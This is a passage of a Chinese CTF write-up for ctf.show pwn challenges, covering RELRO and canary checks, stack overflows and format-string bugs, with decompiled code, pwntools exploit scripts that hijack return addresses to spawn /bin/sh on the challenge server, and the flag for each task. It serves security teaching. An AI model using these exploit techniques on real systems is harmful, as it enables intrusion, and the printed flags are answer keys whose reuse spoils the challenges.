"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : Turn off output, how to get flag? "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fork() )</span><br><span class="line">  {</span><br><span class="line">    wait(<span class="number">0LL</span>);</span><br><span class="line">    sleep(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag is not here!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"give you a shell! now you need to get flag!"</span>);</span><br><span class="line">    fclose(_bss_start);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>LL);</span><br><span class="line">    system(buf);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以使用了 exec 函数来执行 sh命令，并使用 1&gt;&amp;0来进行输出重定向。这个命令将标准输出重定向到标准输入，实际上就是将命令的输出发送到后续命令的输入。</p><p>具体来说， 1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh命令后，进入一个交互式的Shell环境， 可以在该环境中执行命令并与用户进行交互。</p><p>也可以直接exec cat /ctf* 1&gt;&amp;0 将 cat /ctf*命令的输出发送到标准输入，实际上就是将命令的输 出再次输出到屏幕上。</p><hr><h2 id="21-pwn20"><a href="#21-pwn20" class="headerlink" title="21 pwn20"></a>21 pwn20</h2><p>🚩flag：<code>ctfshow{1_1_0x600f18_0x600f28}</code></p><p>💡hint：<code>Linux安全机制</code></p><p>提交ctfshow{【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】}</p><p>例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</p><p>最终flag为ctfshow{1_1_0x400820_0x8208820}</p><p>若某个表不存在，则无需写其对应地址</p><p>如不存在.got.plt表，则最终flag值为ctfshow{1_0_0x400820}</p><blockquote><p>RELRO（Relocation Read-Only）是一种ELF二进制保护机制，用于防止攻击者篡改动态链接过程中的关键内存区域（如GOT表）。它分为三种模式：</p><ol><li><strong>No RELRO</strong>：GOT/PLT完全可写，极易被攻击；</li><li><strong>Partial RELRO</strong>：GOT部分只读（延迟绑定仍可写），中等防护；</li><li><strong>Full RELRO</strong>：启动时立即解析所有符号并完全锁定GOT为只读，提供最强保护但会略微增加启动时间。<br>使用<code>checksec</code>可查看保护状态，安全场景建议开启Full RELRO（编译选项：<code>-Wl,-z,relro -Wl,-z,now</code>）。</li></ol></blockquote><p>先checksec一下：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 19.16.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.16.53.png)</p><p>没有RELRO保护，故.got和.got.plt都存在。</p><p>查看表的地址：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.44.14.png" alt="截屏2025-08-11 19.44.14" style="zoom:50%;"><p>故：ctfshow{1_1_0x600f18_0x600f28}</p><hr><h2 id="22-pwn21"><a href="#22-pwn21" class="headerlink" title="22 pwn21"></a>22 pwn21</h2><p>🚩flag：<code>ctfshow{0_1_0x600ff0_0x601000}</code></p><p>💡hint：<code>Linux安全机制</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>部分防护。</p><p>![截屏2025-08-11 19.47.08](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.47.08.png)</p><p>查看表的地址：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 19.47.53](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.47.53.png)</p><p>ctfshow{0_1_0x600ff0_0x601000}</p><hr><h2 id="23-pwn22"><a href="#23-pwn22" class="headerlink" title="23 pwn22"></a>23 pwn22</h2><p>🚩flag：<code>ctfshow{0_0_0x600fc0}</code></p><p>💡hint：<code>Linux安全机制</code></p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 19.49.19](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.49.19.png)</p><p><strong>Full RELRO</strong>：启动时立即解析所有符号并完全锁定GOT为只读，提供最强保护但会略微增加启动时间。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">readelf -S pwn</span><br></pre></td></tr></tbody></table></figure><img src="/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 19.51.24.png" alt="截屏2025-08-11 19.51.24" style="zoom:50%;"><p>在写.got表的时候就会抛出异常，而.got.plt不存在 故flag:ctfshow{0_0_0x600fc0}</p><hr><h2 id="24-pwn23"><a href="#24-pwn23" class="headerlink" title="24 pwn23"></a>24 pwn23</h2><p>🚩flag：<code>ctfshow{d9d1e78b-1dab-44d8-a705-6c8346051804}</code></p><p>💡hint：<code>缓冲区溢出漏洞</code></p><p>用户名为 ctfshow 密码 为 123456 请使用 ssh软件连接</p><figure class="highlight basic"><table><tbody><tr><td class="code"><pre><span class="line">ssh ctfshow@题目地址 -p题目端口号</span><br></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">__gid_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp-Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp-8h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-24h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [esp+4h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  v3 = getegid();</span><br><span class="line">  setresgid(v3, v3, v3, v5, v6, v7, v3);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048940);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B4);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A30);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ABC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B4C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BD0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C64);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Linux_Security_Mechanisms                               "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : No canary found                                         "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"How to input ?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &gt; <span class="number">1</span> )</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li><p>首先，程序尝试打开名为”/ctfshow_flag”的文件，并将文件指针赋值给 stream变量。如果打开文件失败（文件不存在或无法访问），程序输出错误消息并终止。</p></li><li><p>如果成功打开文件，程序使用 fgets 函数从文件中读取最多64个字符到名为 flag 的缓冲区。</p></li><li><p>程序输出提示消息： “How to input?”。</p></li><li><p>如果程序运行时传入了命令行参数（ argc大于1），则调用 ctfshow 函数，并将第一个命令 行参数作为参数传递给该函数。</p></li><li><p>ctfshow 函数很简单，它接受一个字符串参数 src ，并使用 strcpy 函数将该字符串复制到名 为 dest 的缓冲区中。然后，它返回指向 dest缓冲区的指针。</p></li></ol><p>这里仅仅是为了演示当未开启Canary保护时，输入字符串长度超过了 dest 缓冲区的大小，这可能导致缓冲区溢出漏洞。</p><p>![截屏2025-08-11 20.03.33](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.03.33.png)</p><hr><blockquote><p>25~29 为栈溢出</p></blockquote><h2 id="25-pwn35"><a href="#25-pwn35" class="headerlink" title="25 pwn35"></a>25 pwn35</h2><p>🚩flag：<code>ctfshow{d5502ece-4e3a-45ec-9e5c-2c7f9ca78a09}</code></p><p>💡hint：<code>栈溢出</code></p><p>正式开始栈溢出了，先来一个最最最最简单的吧</p><p>ctfshow{d5502ece-4e3a-45ec-9e5c-2c7f9ca78a09}</p><p>![截屏2025-08-11 20.11.02](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.11.02.png)</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.12.43](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.12.43.png)</p><p>32位程序开启NX，部分开启RELRO 32位</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  FILE *stream; <span class="comment">// [esp+0h] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  stream = fopen(<span class="string">"/ctfshow_flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"/ctfshow_flag: No such file or directory."</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  }</span><br><span class="line">  fgets(flag, <span class="number">64</span>, stream);</span><br><span class="line">  signal(<span class="number">11</span>, (<span class="type">__sighandler_t</span>)sigsegv_handler);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048910);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048984);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A00);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A8C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B1C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048BA0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048C34);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Stack_Overflow                                          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : See what the program does!                              "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Where is flag?\n"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( argc &lt;= <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Try again!"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    ctfshow((<span class="type">char</span> *)argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"QaQ!FLAG IS NOT HERE! Here is your input : %s"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>打开”/ctfshow_flag” 文件，读取其中的内容，并根据命令行参数决定打印不同的消息。如果命令行 参数个数小于等于 1 ，则提示用户重试，否则调用  ctfshow 函数处理用户输入的命令行参数，并输出相关消息。</p><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">ctfshow</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">104</span>]; <span class="comment">// [esp+Ch] [ebp-6Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>char dest:  声明一个名为 dest 的字符变量。 return strcpy(&amp;dest, src): 使用 strcpy 函 数将 src 字符串复制到 dest 字符数组中，并返回指向 dest 的指针。 strcpy函数这个函数是一个典 型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。</p><p>注意到signal(11, (__sighandler_t)sigsegv_handler);函数</p><p>当发生 对存储的无效访问时,会把stderr打印输出,即将flag的值打印输出</p><p>那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag</p><hr><h2 id="26-pwn36"><a href="#26-pwn36" class="headerlink" title="26 pwn36"></a>26 pwn36</h2><p>🚩flag：<code>ctfshow{8197d563-2f34-41d7-94b0-a2ae5fe8d0f0}</code></p><p>💡hint：<code>栈溢出</code></p><p>存在后门函数，如何利用？</p><p>先来checksec</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">checksec --file=pwn</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.17.29](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.17.29.png)</p><p>32位保护仅部分开启RELRO，同时注意到有可读可写可执行的段</p><p>ida查看main函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804883C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80488B0);</span><br><span class="line">  <span class="built_in">puts</span>(asc_804892C);</span><br><span class="line">  <span class="built_in">puts</span>(asc_80489B8);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048A48);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048ACC);</span><br><span class="line">  <span class="built_in">puts</span>(asc_8048B60);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(aClassifyCtfsho);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Type  : Stack_Overflow                                          "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Site  : https://ctf.show/                                       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * Hint  : There are backdoor functions here!                      "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"    * *************************************                           "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Find and use it!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter what you want: "</span>);</span><br><span class="line">  ctfshow(&amp;argc);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">36</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> gets(s);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>使用  gets 函数从标准输入读取一行字符串，并将其存储在 s 数组中。然后，返回指向 s 的指针。 gets 函数是非常不安全的，容易导致缓冲区溢出漏洞。因为它无法限制输入的长度，可能会超出 s 数组的容量，导致覆盖栈上的其他数据或执行任意代码。这也是明显的栈溢出漏洞，s距ebp仅有0x28，而gets不限制输入长度。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>,os = <span class="string">'linux'</span>,log_level = <span class="string">'debug'</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">"pwn.challenge.ctf.show"</span>,<span class="number">28187</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">flag = elf.sym[<span class="string">'get_flag'</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>+<span class="number">4</span>) + p32(flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>运行脚本即可得到flag。</p><hr><h2 id="27-pwn37"><a href="#27-pwn37" class="headerlink" title="27 pwn37"></a>27 pwn37</h2><p>🚩flag：<code>ctfshow{00b37148-e0b5-422c-9a92-0fbe1310dc78}</code></p><p>💡hint：<code>栈溢出</code></p><p>32位的 system(“/bin/sh”) 后门函数给你</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别和架构</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>, arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择本地调试或远程连接（二选一）</span></span><br><span class="line"><span class="comment"># io = process('./pwn')  # 本地调试</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28228</span>)  <span class="comment"># 远程连接</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载ELF文件</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">backdoor_addr = elf.sym[<span class="string">'backdoor'</span>]  <span class="comment"># 获取backdoor函数地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload：填充偏移 + 返回地址</span></span><br><span class="line">offset = <span class="number">0x12</span> + <span class="number">4</span>  <span class="comment"># 假设偏移量是0x12 + 4（覆盖返回地址）</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset + p32(backdoor_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>溢出覆盖返回地址再输入后门函数地址即可控制程序的执行流程</p><hr><h2 id="28-pwn38"><a href="#28-pwn38" class="headerlink" title="28 pwn38"></a>28 pwn38</h2><p>🚩flag：<code>ctfshow{3fc5ea88-fa41-45c3-b57c-861618063a48}</code></p><p>💡hint：<code>栈溢出</code></p><p>64位的 system(“/bin/sh”) 后门函数给你</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28270</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>思路和上一个题目类似。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> ctfshow_flag</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.49.48](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.49.48.png)</p><hr><h2 id="29-pwn39"><a href="#29-pwn39" class="headerlink" title="29 pwn39"></a>29 pwn39</h2><p>🚩flag：<code>ctfshow{4a15a146-0370-4287-b0b1-a047a5779ae1}</code></p><p>💡hint：<code>栈溢出</code></p><p>32位的 system(); “/bin/sh”</p><p>漏洞函数ctfshow()。</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28309</span>)</span><br><span class="line">payload = <span class="string">b'a'</span>*(<span class="number">0x12</span>+<span class="number">4</span>) + p32(<span class="number">0x80483A0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x8048750</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></tbody></table></figure><p>![截屏2025-08-11 20.56.31](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 20.56.31.png)</p><hr><blockquote><p>30~33为格式化字符</p></blockquote><h2 id="30-pwn91"><a href="#30-pwn91" class="headerlink" title="30 pwn91"></a>30 pwn91</h2><p>🚩flag：<code>ctfshow{2d4ff392-5150-475d-a7c1-443e845a4b4d}</code></p><p>💡hint：<code>格式化字符串</code></p><p>开始格式化字符串了，先来个简单的吧</p><p>![截屏2025-08-11 21.17.10](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 21.17.10.png)</p><p>32位关闭PIE，部分开启RELRO</p><p>ida查看main函数</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  init(&amp;argc);</span><br><span class="line">  logo();</span><br><span class="line">  ctfshow();</span><br><span class="line">  <span class="keyword">if</span> ( daniu == <span class="number">6</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"daniu praise you for a good job!"</span>);</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到当daniu = 6 的时候即可获的一个shell</p><p>跟进ctfshow函数：</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">char</span> s[<span class="number">80</span>]; <span class="comment">// [esp+Ch] [ebp-5Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+5Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x50u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"daniu now is :%d!\n"</span>, daniu);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>可以看到这里的ptintf(s)明显的存在格式化字符串漏洞</p><p>daniu的地址为： 0x804B038</p><p>![截屏2025-08-11 21.21.42](/Users/serenius/Library/Application Support/typora-user-images/截屏2025-08-11 21.21.42.png)</p><p>可以看到daniu在bss段，测一下格式化字符串的偏移，可以看到偏移为7</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置日志级别</span></span><br><span class="line">context(log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程连接</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>, <span class="number">28262</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标地址</span></span><br><span class="line">daniu = <span class="number">0x804B038</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造格式化字符串payload</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, {daniu: <span class="number">6</span>})</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送payload并交互</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>通过shell获取flag。</p><hr><h2 id="31-pwn92"><a href="#31-pwn92" class="headerlink" title="31 pwn92"></a>31 pwn92</h2><p>🚩flag：<code>ctfshow{4f5e810f-72b6-447f-8a30-a74822609048}</code></p><p>💡hint：<code>格式化字符串</code></p><p>可能上一题没太看懂？来看下基础吧</p><p>ida分析函数，得知使用用户输入的格式化字符串将 s 输出，如果需要获取flag，仅仅需要使用 %s 输出flag字符串即可获取flag</p><figure class="highlight python"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process('./pwn')</span></span><br><span class="line">io = remote(<span class="string">'pwn.challenge.ctf.show'</span>,<span class="number">28223</span>) </span><br><span class="line">io.sendline(<span class="string">'%s'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><hr><h2 id="32-pwn93"><a href="#32-pwn93" class="headerlink" title="32 pwn93"></a>32 pwn93</h2><p>🚩flag：<code>ctfshow{cc14b02c-70f9-461e-aa67-96516a0834a0}</code></p><p>💡hint：<code>格式化字符串</code></p><p>emmm，再来一道基础原理？</p><figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  logo();</span><br><span class="line">  menu();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Enter your choice: "</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      func1();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      func2();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      func3();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      func4();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      func5();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      nothing_here();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      exit0();</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Invalid choice. Please enter a valid option."</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 